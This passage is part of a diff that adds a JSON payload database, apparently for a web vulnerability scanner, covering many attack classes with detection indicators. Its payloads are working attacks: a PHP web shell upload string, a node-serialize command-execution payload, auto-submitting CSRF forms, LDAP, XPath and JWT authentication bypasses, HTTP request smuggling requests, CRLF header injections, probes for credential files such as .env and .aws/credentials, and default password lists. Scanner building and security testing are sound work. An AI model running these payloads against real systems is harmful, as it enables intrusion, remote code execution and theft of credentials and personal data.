+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "*",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "*)(&",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "*)(uid=*",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "admin*",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "*)(|(uid=*",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "*)(uid=*))(|(uid=*",
+          "encoding": "none",
+          "type": "bypass_auth"
+        },
+        {
+          "payload": "admin)(&(password=*))",
+          "encoding": "none",
+          "type": "bypass_auth"
+        },
+        {
+          "payload": "*)(objectClass=*",
+          "encoding": "none",
+          "type": "bypass_auth"
+        },
+        {
+          "payload": "*)(cn=*",
+          "encoding": "none",
+          "type": "blind"
+        },
+        {
+          "payload": "*)(mail=*@*",
+          "encoding": "none",
+          "type": "blind"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "LDAP Result Code 2",
+          "ldap_search_s() failed",
+          "ldap_bind() failed",
+          "javax.naming.NamingException",
+          "javax.naming.directory.InvalidSearchFilterException",
+          "System.DirectoryServices.DirectoryServicesCOMException",
+          "Invalid filter syntax",
+          "Bad search filter"
+        ],
+        "delay_based": false
+      }
+    },
+    "CORS": {
+      "name_abbr": "CORS",
+      "name_full": "cors_misconfiguration",
+      "severity": "medium",
+      "cvss_base": 6.5,
+      "injection_points": [
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "http://attacker.com",
+          "encoding": "none",
+          "type": "origin_reflection",
+          "note": "à mettre dans l'en-tête Origin"
+        },
+        {
+          "payload": "https://attacker.com",
+          "encoding": "none",
+          "type": "origin_reflection"
+        },
+        {
+          "payload": "null",
+          "encoding": "none",
+          "type": "origin_reflection"
+        },
+        {
+          "payload": "http://evil.target.com",
+          "encoding": "none",
+          "type": "subdomain_bypass"
+        },
+        {
+          "payload": "http://target.com.attacker.com",
+          "encoding": "none",
+          "type": "subdomain_bypass"
+        },
+        {
+          "payload": "http://attacker.com.target.com",
+          "encoding": "none",
+          "type": "prefix_suffix"
+        },
+        {
+          "payload": "http://target.com.attacker.com",
+          "encoding": "none",
+          "type": "prefix_suffix"
+        },
+        {
+          "payload": "http://attackertarget.com",
+          "encoding": "none",
+          "type": "prefix_suffix"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Access-Control-Allow-Origin: http://attacker.com",
+          "Access-Control-Allow-Origin: https://attacker.com",
+          "Access-Control-Allow-Origin: null",
+          "Access-Control-Allow-Credentials: true",
+          "Access-Control-Allow-Origin: *"
+        ],
+        "delay_based": false
+      }
+    },
+    "CSRF": {
+      "name_abbr": "CSRF",
+      "name_full": "cross-site_request_forgery",
+      "severity": "medium",
+      "cvss_base": 6.5,
+      "injection_points": [
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "<img src='http://vulnerable.com/transfer?to=attacker&amount=1000'>",
+          "encoding": "none",
+          "type": "get_based"
+        },
+        {
+          "payload": "<img src='http://vulnerable.com/delete?id=1' style='display:none'>",
+          "encoding": "none",
+          "type": "get_based"
+        },
+        {
+          "payload": "<form action='http://vulnerable.com/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='1000'></form><script>document.forms[0].submit();</script>",
+          "encoding": "none",
+          "type": "post_based"
+        },
+        {
+          "payload": "<iframe style='display:none' name='csrf-frame'></iframe><form target='csrf-frame' action='http://vulnerable.com/action' method='POST'><input name='action' value='delete'></form><script>document.forms[0].submit();</script>",
+          "encoding": "none",
+          "type": "post_based"
+        },
+        {
+          "payload": "<script>fetch('http://vulnerable.com/api/action', {method: 'POST', credentials: 'include', body: JSON.stringify({action: 'delete'})})</script>",
+          "encoding": "none",
+          "type": "ajax_based"
+        },
+        {
+          "payload": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://vulnerable.com/action');xhr.withCredentials=true;xhr.send('action=delete');</script>",
+          "encoding": "none",
+          "type": "ajax_based"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "CSRF token missing",
+          "CSRF token invalid",
+          "Invalid or missing CSRF",
+          "Forbidden: CSRF verification failed",
+          "csrfmiddlewaretoken",
+          "X-CSRFToken"
+        ],
+        "delay_based": false
+      }
+    },
+    "OpenRedirect": {
+      "name_abbr": "OpenRedirect",
+      "name_full": "open_redirect",
+      "severity": "medium",
+      "cvss_base": 6.1,
+      "injection_points": [
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "http://attacker.com",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "https://attacker.com",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "//attacker.com",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "javascript:alert(1)",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "?redirect=http://attacker.com",
+          "encoding": "none",
+          "type": "parameter_based"
+        },
+        {
+          "payload": "?url=https://attacker.com",
+          "encoding": "none",
+          "type": "parameter_based"
+        },
+        {
+          "payload": "?next=//attacker.com",
+          "encoding": "none",
+          "type": "parameter_based"
+        },
+        {
+          "payload": "?return=http://attacker.com",
+          "encoding": "none",
+          "type": "parameter_based"
+        },
+        {
+          "payload": "http://attacker.com@target.com",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": "http://target.com.attacker.com",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": "http://target.com%2F@attacker.com",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": "///attacker.com",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": "https:attacker.com",
+          "encoding": "none",
+          "type": "bypass_filters"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Location: http://attacker.com",
+          "Location: https://attacker.com",
+          "Location: //attacker.com"
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecUpload": {
+      "name_abbr": "InsecUpload",
+      "name_full": "insecure_file_upload",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "shell.php",
+          "encoding": "none",
+          "type": "php_shells"
+        },
+        {
+          "payload": "shell.php5",
+          "encoding": "none",
+          "type": "php_shells"
+        },
+        {
+          "payload": "shell.phtml",
+          "encoding": "none",
+          "type": "php_shells"
+        },
+        {
+          "payload": "shell.phar",
+          "encoding": "none",
+          "type": "php_shells"
+        },
+        {
+          "payload": "shell.php.jpg",
+          "encoding": "none",
+          "type": "double_extension"
+        },
+        {
+          "payload": "shell.php.png",
+          "encoding": "none",
+          "type": "double_extension"
+        },
+        {
+          "payload": "shell.php.txt",
+          "encoding": "none",
+          "type": "double_extension"
+        },
+        {
+          "payload": "image.jpg.php",
+          "encoding": "none",
+          "type": "double_extension"
+        },
+        {
+          "payload": "shell.php.jpg",
+          "encoding": "none",
+          "note": "null byte dans le nom, mais le payload contient déjà %00, on laisse encoding: none et on documente",
+          "type": "null_byte"
+        },
+        {
+          "payload": "shell.php.png",
+          "encoding": "none",
+          "type": "null_byte"
+        },
+        {
+          "payload": "GIF89a; <?php system($_GET['cmd']); ?>",
+          "encoding": "none",
+          "type": "mime_bypass"
+        },
+        {
+          "payload": "../../../shell.php",
+          "encoding": "none",
+          "type": "path_traversal_upload"
+        },
+        {
+          "payload": ".htaccess",
+          "encoding": "none",
+          "type": "htaccess_upload"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "File uploaded successfully",
+          "successfully uploaded",
+          "/uploads/shell.php",
+          "/upload/shell",
+          "saved as shell.php",
+          "has been uploaded"
+        ],
+        "delay_based": false
+      }
+    },
+    "JWT": {
+      "name_abbr": "JWT",
+      "name_full": "jwt_vulnerabilities",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "header",
+        "cookie",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+          "encoding": "none",
+          "type": "none_algorithm"
+        },
+        {
+          "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+          "encoding": "none",
+          "type": "valid_example"
+        },
+        {
+          "payload": "{\"kid\": \"../../../../dev/null\"}",
+          "encoding": "none",
+          "type": "kid_injection"
+        },
+        {
+          "payload": "{\"kid\": \"|whoami\"}",
+          "encoding": "none",
+          "type": "kid_injection"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Welcome admin",
+          "role\":\"admin\"",
+          "\"isAdmin\":true",
+          "privileged access granted",
+          "alg: none accepted",
+          "invalid signature ignored"
+        ],
+        "delay_based": false
+      }
+    },
+    "GraphQLi": {
+      "name_abbr": "GraphQLi",
+      "name_full": "graphql_injection",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "query",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "{ __schema { types { name } } }",
+          "encoding": "none",
+          "type": "introspection"
+        },
+        {
+          "payload": "{ __type(name: \"User\") { fields { name } } }",
+          "encoding": "none",
+          "type": "introspection"
+        },
+        {
+          "payload": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }",
+          "encoding": "none",
+          "type": "introspection"
+        },
+        {
+          "payload": "query { user(id: \"1' OR '1'='1\") { name } }",
+          "encoding": "none",
+          "type": "sqli_in_graphql"
+        },
+        {
+          "payload": "query { users(filter: \"name='admin' OR '1'='1\") { id } }",
+          "encoding": "none",
+          "type": "sqli_in_graphql"
+        },
+        {
+          "payload": "query { user { posts { user { posts { user { posts { title } } } } } } }",
+          "encoding": "none",
+          "type": "dos"
+        },
+        {
+          "payload": "query { a:__typename b:__typename c:__typename ... z:__typename }",
+          "encoding": "none",
+          "type": "dos"
+        },
+        {
+          "payload": "[{\"query\":\"mutation {deleteUser(id:1)}\"},{\"query\":\"mutation {deleteUser(id:2)}\"}]",
+          "encoding": "none",
+          "type": "batching_attack"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "\"__schema\"",
+          "\"queryType\"",
+          "\"mutationType\"",
+          "\"kinds\":",
+          "\"OBJECT\"",
+          "\"SCALAR\"",
+          "graphql error",
+          "Cannot query field"
+        ],
+        "delay_based": false
+      }
+    },
+    "IDOR": {
+      "name_abbr": "IDOR",
+      "name_full": "insecure_direct_object_reference",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "1",
+          "encoding": "none",
+          "type": "numeric_ids"
+        },
+        {
+          "payload": "2",
+          "encoding": "none",
+          "type": "numeric_ids"
+        },
+        {
+          "payload": "1000",
+          "encoding": "none",
+          "type": "numeric_ids"
+        },
+        {
+          "payload": "/api/user/1/profile",
+          "encoding": "none",
+          "type": "sequential_access"
+        },
+        {
+          "payload": "/api/user/2/profile",
+          "encoding": "none",
+          "type": "sequential_access"
+        },
+        {
+          "payload": "/api/documents/1",
+          "encoding": "none",
+          "type": "sequential_access"
+        },
+        {
+          "payload": "/api/documents/2",
+          "encoding": "none",
+          "type": "sequential_access"
+        },
+        {
+          "payload": "?id=1",
+          "encoding": "none",
+          "type": "param_based"
+        },
+        {
+          "payload": "?user_id=2",
+          "encoding": "none",
+          "type": "param_based"
+        },
+        {
+          "payload": "?document_id=999",
+          "encoding": "none",
+          "type": "param_based"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "\"email\":",
+          "\"phone\":",
+          "\"address\":",
+          "\"account_number\":",
+          "\"credit_card\":",
+          "\"ssn\":",
+          "\"date_of_birth\":",
+          "personal information",
+          "\"user_id\":"
+        ],
+        "delay_based": false
+      }
+    },
+    "Prototype_Pollution": {
+      "name_abbr": "Prototype_Pollution",
+      "name_full": "prototype_pollution",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "body",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "{\"__proto__\": {\"isAdmin\": true}}",
+          "encoding": "none",
+          "type": "constructor_pollution"
+        },
+        {
+          "payload": "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
+          "encoding": "none",
+          "type": "constructor_pollution"
+        },
+        {
+          "payload": "?__proto__[isAdmin]=true",
+          "encoding": "none",
+          "type": "constructor_pollution"
+        },
+        {
+          "payload": "?constructor[prototype][isAdmin]=true",
+          "encoding": "none",
+          "type": "constructor_pollution"
+        },
+        {
+          "payload": "{\"__proto__\": {\"polluted\": \"yes\"}}",
+          "encoding": "none",
+          "type": "merge_pollution"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "\"isAdmin\":true",
+          "\"polluted\":\"yes\"",
+          "__proto__ accepted",
+          "prototype chain modified",
+          "constructor.prototype"
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecDeser": {
+      "name_abbr": "InsecDeser",
+      "name_full": "insecure_deserialization",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "form",
+        "cookie",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "O:8:\"Evil\":1:{s:4:\"cmd\";s:2:\"id\";}",
+          "encoding": "none",
+          "type": "php_object_injection"
+        },
+        {
+          "payload": "a:1:{i:0;O:8:\"Evil\":1:{s:4:\"cmd\";s:6:\"whoami\";}}",
+          "encoding": "none",
+          "type": "php_object_injection"
+        },
+        {
+          "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });}()\"}",
+          "encoding": "none",
+          "type": "node_serialize"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "uid=0(root)",
+          "uid=33(www-data)",
+          "unserialize(): Error at offset",
+          "PHP Notice:  unserialize()",
+          "O:8:\"Evil\"",
+          "_$$ND_FUNC$$_"
+        ],
+        "delay_based": false
+      }
+    },
+    "RaceCondition": {
+      "name_abbr": "RaceCondition",
+      "name_full": "race_conditions",
+      "severity": "medium",
+      "cvss_base": 6.5,
+      "injection_points": [
+        "form",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "concurrent_requests",
+          "encoding": "none",
+          "type": "concurrent_requests"
+        },
+        {
+          "payload": "simultaneous_file_operations",
+          "encoding": "none",
+          "type": "toctou"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Duplicate entry",
+          "UNIQUE constraint failed",
+          "already redeemed",
+          "used more than once",
+          "concurrent modification detected",
+          "balance inconsistency"
+        ],
+        "delay_based": true
+      }
+    },
+    "HTTP_Request_Smuggling": {
+      "name_abbr": "HTTP_Request_Smuggling",
+      "name_full": "http_request_smuggling",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n0\r\n\r\n",
+          "encoding": "none",
+          "type": "te_cl"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n",
+          "encoding": "none",
+          "type": "te_te"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "HTTP/1.1 400 Bad Request",
+          "Invalid request",
+          "chunked encoding conflict",
+          "Transfer-Encoding conflict",
+          "admin panel",
+          "desynchronized"
+        ],
+        "delay_based": false
+      }
+    },
+    "CRLF_Injection": {
+      "name_abbr": "CRLF_Injection",
+      "name_full": "http_header_injection",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "query",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "%0d%0aSet-Cookie: admin=true",
+          "encoding": "none",
+          "type": "header_injection"
+        },
+        {
+          "payload": "%0d%0aLocation: http://attacker.com",
+          "encoding": "none",
+          "type": "header_injection"
+        },
+        {
+          "payload": "%0d%0a%0d%0a<script>alert(1)</script>",
+          "encoding": "none",
+          "type": "response_splitting"
+        },
+        {
+          "payload": "\r\nSet-Cookie: admin=true\r\n",
+          "encoding": "none",
+          "type": "header_injection"
+        },
+        {
+          "payload": "\r\n\r\n<html><script>alert(1)</script></html>",
+          "encoding": "none",
+          "type": "response_splitting"
+        },
+        {
+          "payload": "%0d%0a<?php system($_GET['cmd']); ?>",
+          "encoding": "none",
+          "type": "log_poisoning"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Set-Cookie: admin=true",
+          "Location: http://attacker.com",
+          "CRLF injection detected",
+          "HTTP Response Splitting",
+          "injected header accepted"
+        ],
+        "delay_based": false
+      }
+    },
+    "XPATH_Injection": {
+      "name_abbr": "XPATH_Injection",
+      "name_full": "xpath_injection",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "' or '1'='1",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "' or 1=1 or ''='",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "admin' or '1'='1",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "x' or 1=1 or 'x'='y",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "' and substring(//user[1]/password,1,1)='a",
+          "encoding": "none",
+          "type": "blind"
+        },
+        {
+          "payload": "' and string-length(//user[1]/password)>5 and '1'='1",
+          "encoding": "none",
+          "type": "blind"
+        },
+        {
+          "payload": "' or count(//user)>0 and '1'='1",
+          "encoding": "none",
+          "type": "extraction"
+        },
+        {
+          "payload": "' or //user[1]/username='admin' and '1'='1",
+          "encoding": "none",
+          "type": "extraction"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "XPathException",
+          "XPath syntax error",
+          "javax.xml.xpath.XPathExpressionException",
+          "lxml.etree.XPathEvalError",
+          "Invalid predicate",
+          "Unexpected token or",
+          "Invalid expression"
+        ],
+        "delay_based": false
+      }
+    },
+    "RateLimit": {
+      "name_abbr": "RateLimit",
+      "name_full": "rate_limiting_issues",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "header",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "X-Forwarded-For: 1.2.3.4",
+          "encoding": "none",
+          "type": "ip_rotation"
+        },
+        {
+          "payload": "X-Forwarded-For: 127.0.0.1",
+          "encoding": "none",
+          "type": "localhost"
+        },
+        {
+          "payload": "X-Real-IP: 1.2.3.4",
+          "encoding": "none",
+          "type": "real_ip"
+        },
+        {
+          "payload": "X-Originating-IP: 1.2.3.4",
+          "encoding": "none",
+          "type": "originating_ip"
+        },
+        {
+          "payload": "X-Remote-IP: 1.2.3.4",
+          "encoding": "none",
+          "type": "remote_ip"
+        },
+        {
+          "payload": "X-Client-IP: 1.2.3.4",
+          "encoding": "none",
+          "type": "client_ip"
+        },
+        {
+          "payload": "True-Client-IP: 1.2.3.4",
+          "encoding": "none",
+          "type": "true_client"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "429 Too Many Requests",
+          "Rate limit exceeded",
+          "Too many requests",
+          "Retry-After:",
+          "X-RateLimit-Remaining: 0",
+          "quota exceeded",
+          "throttled"
+        ],
+        "delay_based": true,
+        "min_delay_seconds": 10
+      }
+    },
+    "InfoDisc": {
+      "name_abbr": "InfoDisc",
+      "name_full": "information_disclosure",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "/.env",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/.git/config",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/config.php",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/web.config",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/settings.json",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/.aws/credentials",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/.bash_history",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/backup.sql",
+          "encoding": "none",
+          "type": "backup_files"
+        },
+        {
+          "payload": "/.vscode/settings.json",
+          "encoding": "none",
+          "type": "sensitive_files"
+        },
+        {
+          "payload": "/composer.json",
+          "encoding": "none",
+          "type": "config_files"
+        },
+        {
+          "payload": "/package.json",
+          "encoding": "none",
+          "type": "config_files"
+        },
+        {
+          "payload": "/phpinfo.php",
+          "encoding": "none",
+          "type": "debug_endpoints"
+        },
+        {
+          "payload": "/debug.log",
+          "encoding": "none",
+          "type": "log_files"
+        },
+        {
+          "payload": "/error_log",
+          "encoding": "none",
+          "type": "log_files"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "DB_PASSWORD=",
+          "DB_PASS=",
+          "DATABASE_PASSWORD=",
+          "API_KEY=",
+          "API_SECRET=",
+          "SECRET_KEY=",
+          "APP_SECRET=",
+          "aws_access_key_id =",
+          "aws_secret_access_key =",
+          "-----BEGIN RSA PRIVATE KEY-----",
+          "-----BEGIN PRIVATE KEY-----",
+          "-----BEGIN OPENSSH PRIVATE KEY-----",
+          "phpinfo()",
+          "PHP Version",
+          "[core]",
+          "repositoryformatversion"
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecCrypto": {
+      "name_abbr": "InsecCrypto",
+      "name_full": "insecure_crypto",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "weak_cipher_detection",
+          "encoding": "none",
+          "type": "cipher_detection"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "TLS_RSA_WITH_RC4_128_MD5",
+          "SSL_CK_RC4_128_WITH_MD5",
+          "TLS_RSA_WITH_DES_CBC_SHA",
+          "SSLv3",
+          "TLSv1.0",
+          "TLSv1.1",
+          "MD5WithRSAEncryption",
+          "sha1WithRSAEncryption"
+        ],
+        "delay_based": false
+      }
+    },
+    "CredsExpose": {
+      "name_abbr": "CredsExpose",
+      "name_full": "exposed_credentials",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "/.env",
+          "encoding": "none",
+          "type": "env"
+        },
+        {
+          "payload": "/.git/config",
+          "encoding": "none",
+          "type": "git"
+        },
+        {
+          "payload": "/.aws/credentials",
+          "encoding": "none",
+          "type": "aws"
+        },
+        {
+          "payload": "/database.yml",
+          "encoding": "none",
+          "type": "config"
+        },
+        {
+          "payload": "/wp-config.php",
+          "encoding": "none",
+          "type": "wordpress"
+        },
+        {
+          "payload": "/config.json",
+          "encoding": "none",
+          "type": "config"
+        },
+        {
+          "payload": "/secrets.yml",
+          "encoding": "none",
+          "type": "secrets"
+        },
+        {
+          "payload": "/.env.local",
+          "encoding": "none",
+          "type": "env_local"
+        },
+        {
+          "payload": "/.env.production",
+          "encoding": "none",
+          "type": "env"
+        },
+        {
+          "payload": "/config/database.php",
+          "encoding": "none",
+          "type": "config"
+        },
+        {
+          "payload": "/application.properties",
+          "encoding": "none",
+          "type": "config"
+        },
+        {
+          "payload": "/credentials.json",
+          "encoding": "none",
+          "type": "config"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "DB_PASSWORD=",
+          "DB_PASS=",
+          "DATABASE_PASSWORD=",
+          "API_KEY=",
+          "API_SECRET=",
+          "SECRET_KEY=",
+          "aws_access_key_id =",
+          "aws_secret_access_key =",
+          "-----BEGIN RSA PRIVATE KEY-----",
+          "-----BEGIN PRIVATE KEY-----",
+          "-----BEGIN OPENSSH PRIVATE KEY-----",
+          "define('DB_PASSWORD'",
+          "define('DB_USER'",
+          "password:",
+          "username:"
+        ],
+        "delay_based": false
+      }
+    },
+    "BrokenAuth": {
+      "name_abbr": "BrokenAuth",
+      "name_full": "broken_authentication",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "form",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "admin:admin",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "admin:123456",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "root:root",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "admin:password",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "test:test",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "guest:guest",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "administrator:password",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "admin:admin123",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "root:toor",
+          "encoding": "none",
+          "type": "default_creds"
+        },
+        {
+          "payload": "admin:",
+          "encoding": "none",
+          "type": "empty_password"
+        },
+        {
+          "payload": "admin:12345",
+          "encoding": "none",
+          "type": "default_creds"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Welcome, admin",
+          "Logged in as",
+          "Dashboard",
+          "My Account",
+          "Set-Cookie: session=",
+          "Set-Cookie: auth=",
+          "access_token",
+          "auth_token"
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecPerm": {
+      "name_abbr": "InsecPerm",
+      "name_full": "insecure_permissions",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "/admin",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/administrator",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/admin.php",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/cpanel",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/wp-admin",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/api/admin",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/user/999/profile",
+          "encoding": "none",
+          "type": "idor"
+        },
+        {
+          "payload": "/api/documents/999",
+          "encoding": "none",
+          "type": "idor"
+        },
+        {
+          "payload": "/admin/dashboard",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/manager/html",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/phpmyadmin",
+          "encoding": "none",
+          "type": "path"
+        },
+        {
+          "payload": "/api/users/1",
+          "encoding": "none",
+          "type": "idor"
+        },
+        {
+          "payload": "/account/9999",
+          "encoding": "none",
+          "type": "idor"
+        },
+        {
+          "payload": "/order/12345",
+          "encoding": "none",
+          "type": "idor"
+        },
+        {
+          "payload": "/file/download?id=999",
+          "encoding": "none",
+          "type": "idor"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Admin Panel",
+          "Administration Console",
+          "phpMyAdmin",
+          "cPanel",
+          "Apache Tomcat Manager",
+          "Welcome to Tomcat",
+          "WordPress Dashboard",
+          "You should not be here"
+        ],
+        "delay_based": false
+      }
+    },
+    "SessFix": {
+      "name_abbr": "SessFix",
+      "name_full": "session_fixation",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "cookie",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "PHPSESSID=attacker_controlled_session",
+          "encoding": "none",
+          "type": "cookie_fixation"
+        },
+        {
+          "payload": "?sessionid=known_value_12345",
+          "encoding": "none",
+          "type": "query_param"
+        },
+        {
+          "payload": "JSESSIONID=fixed_session_id",
+          "encoding": "none",
+          "type": "cookie_fixation"
+        },
+        {
+          "payload": "session_token=predictable_token",
+          "encoding": "none",
+          "type": "cookie_fixation"
+        },
+        {
+          "payload": "?PHPSESSID=attacker_session",
+          "encoding": "none",
+          "type": "query_param"
+        },
+        {
+          "payload": "ASP.NET_SessionId=fixed_id",
+          "encoding": "none",
+          "type": "cookie_fixation"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "Set-Cookie: PHPSESSID=attacker_controlled_session",
+          "Set-Cookie: JSESSIONID=fixed_session_id",
+          "attacker_controlled_session",
+          "predictable_token",
+          "session_id reused"
+        ],
+        "delay_based": false
+      }
+    },
+    "BufOvr": {
+      "name_abbr": "BufOvr",
+      "name_full": "buffer_overflow",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header"
+      ],
+      "payloads":[
+        {"payload": "A", "encoding": "none", "type": "overflow", "repeat": 5000},
+        {"payload": "%x.%x.%x.%x.%x.%x.%x.%x", "encoding": "none", "type": "format_string"},
